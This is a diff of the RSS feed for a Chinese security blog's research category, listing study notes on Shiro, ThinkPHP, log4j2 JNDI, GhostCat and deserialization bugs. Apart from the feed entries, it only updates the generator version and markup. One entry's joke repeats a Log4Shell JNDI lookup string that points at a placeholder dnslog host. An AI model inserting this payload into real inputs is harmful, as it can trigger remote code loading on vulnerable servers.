@@ -4,7 +4,7 @@
     <title>安全研究 on ch4ser の 超元域</title>
     <link>https://dragonbox.top/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/</link>
     <description>Recent content in 安全研究 on ch4ser の 超元域</description>
-    <generator>Hugo -- 0.149.1</generator>
+    <generator>Hugo -- 0.154.5</generator>
     <language>en-us</language>
     <lastBuildDate>Tue, 30 Apr 2024 20:29:05 +0800</lastBuildDate>
     <atom:link href="https://dragonbox.top/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/index.xml" rel="self" type="application/rss+xml" />
@@ -21,7 +21,8 @@
       <pubDate>Sat, 22 Jan 2022 10:52:46 +0000</pubDate>
       <guid>https://dragonbox.top/posts/sec-shiro-attack/</guid>
       <description>&lt;blockquote&gt;
-&lt;p&gt;记录shiro漏洞学习的过程, 参考https://saucer-man.com/information_security/396.html, 并在漏洞分析基础上编写检测脚本&lt;/p&gt;&lt;/blockquote&gt;</description>
+&lt;p&gt;记录shiro漏洞学习的过程, 参考https://saucer-man.com/information_security/396.html, 并在漏洞分析基础上编写检测脚本&lt;/p&gt;
+&lt;/blockquote&gt;</description>
     </item>
     <item>
       <title>thinkphp5漏洞学习</title>
@@ -29,7 +30,8 @@
       <pubDate>Fri, 14 Jan 2022 22:19:13 +0000</pubDate>
       <guid>https://dragonbox.top/posts/sec-phpggc-thinkphp/</guid>
       <description>&lt;blockquote&gt;
-&lt;p&gt;phpggc中关于thinkphp的攻击思路学习&lt;/p&gt;&lt;/blockquote&gt;</description>
+&lt;p&gt;phpggc中关于thinkphp的攻击思路学习&lt;/p&gt;
+&lt;/blockquote&gt;</description>
     </item>
     <item>
       <title>log4j2 jndi 漏洞学习和调试</title>
@@ -44,7 +46,8 @@
 我: ${jndi:ldap://xxx.dnslog.cn/exp}
 面试官: 你平时有动手调试过吗?
 我: ${jndi:ldap://xxx.dnslog.cn/exp}
-我：这dnslog是不是卡了 这面试官怎么还没rce&lt;/p&gt;&lt;/blockquote&gt;</description>
+我：这dnslog是不是卡了 这面试官怎么还没rce&lt;/p&gt;
+&lt;/blockquote&gt;</description>
     </item>
     <item>
       <title>GhostCat(CVE-2020-1938)漏洞学习</title>
@@ -52,7 +55,8 @@
       <pubDate>Sat, 13 Nov 2021 13:14:29 +0000</pubDate>
       <guid>https://dragonbox.top/posts/sec-ghostcat/</guid>
       <description>&lt;blockquote&gt;
-&lt;p&gt;本文主要参考 &lt;a href=&#34;https://blog.csdn.net/qq_31481187/article/details/105917392&#34;&gt;https://blog.csdn.net/qq_31481187/article/details/105917392&lt;/a&gt; 和 &lt;a href=&#34;https://paper.seebug.org/1142/#_6&#34;&gt;https://paper.seebug.org/1142/#_6&lt;/a&gt; ，并无原创内容，仅仅是个人学习笔记。&lt;/p&gt;&lt;/blockquote&gt;</description>
+&lt;p&gt;本文主要参考 &lt;a href=&#34;https://blog.csdn.net/qq_31481187/article/details/105917392&#34;&gt;https://blog.csdn.net/qq_31481187/article/details/105917392&lt;/a&gt; 和 &lt;a href=&#34;https://paper.seebug.org/1142/#_6&#34;&gt;https://paper.seebug.org/1142/#_6&lt;/a&gt; ，并无原创内容，仅仅是个人学习笔记。&lt;/p&gt;
+&lt;/blockquote&gt;</description>
     </item>
     <item>
       <title>mysql jdbc反序列化的不深入研究</title>
@@ -60,7 +64,8 @@
       <pubDate>Fri, 15 Oct 2021 21:46:28 +0000</pubDate>
       <guid>https://dragonbox.top/posts/sec-jdbc-unserialize/</guid>
       <description>&lt;blockquote&gt;
-&lt;p&gt;我终于更新博客了……&lt;/p&gt;&lt;/blockquote&gt;</description>
+&lt;p&gt;我终于更新博客了……&lt;/p&gt;
+&lt;/blockquote&gt;</description>
     </item>
     <item>
       <title>http请求走私笔记</title>
